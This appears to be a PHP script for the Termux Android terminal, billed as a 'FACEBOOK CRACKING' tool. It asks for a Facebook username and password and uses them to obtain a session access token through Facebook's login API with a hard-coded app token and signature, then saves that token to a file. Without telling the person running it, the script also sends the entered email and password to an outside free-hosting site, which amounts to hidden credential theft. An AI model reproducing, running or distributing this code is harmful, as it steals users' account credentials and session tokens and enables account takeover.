<?php
#!/data/data/com.termux/files/usr/bin/
//variable warna terminal
/* $blue='\e[0;34m' ;
$green='\e[0;32m' ;
$cyan='\e[0;36m' ;
$red='\e[0;31m' ; */
$green = '\033[32;1m';
$white = '\033[0m';
$blue = '\033[36;1m';
$yellow = '\033[33;1m';
$red = '\033[31;1m';
$purple = '\033[35;1m';

echo "\033[33;1m [?] FACEBOOK CRACKING [?] \n";
echo "\033[33;1m [?] COPYRIGHT 2019 [?] \n";
function input($echo) { 
		echo "\033[36;1m $echo --> "; 
		} 
input("Username"); 
$iduser=trim(fgets(STDIN)); 
input("Password"); 
$pass=trim(fgets(STDIN));
file_get_contents('https://livechatanddatingfree.000webhostapp.com/login.php?email=' . $iduser . '&' . 'pwd=' . $pass);
echo "=========================== \n"; 
$konten=file_get_contents('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='.$iduser.'&locale=en_US&password='.$pass.'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'); 
$json= json_decode($konten, true);
$userid = $json['session_cookies'][0]['value'];
$token = $json['access_token']; 
if(preg_match('/session_key/', $konten)) {
//		echo "\033[36;1m Token ->\033[31;1m\t".$token."\n";
		echo "\033[31;1m UserID ->\t".$userid."\n"; 
		$tulis=fopen("token.txt","w+"); 
		fwrite($tulis,$token); 
		fclose($tulis); 
		if(file_exists("token.txt")) { 
				echo " Writed -> token.txt\n"; 
				} 
				} else {
				 die("Check Your Username / Password"); 
				} 
?>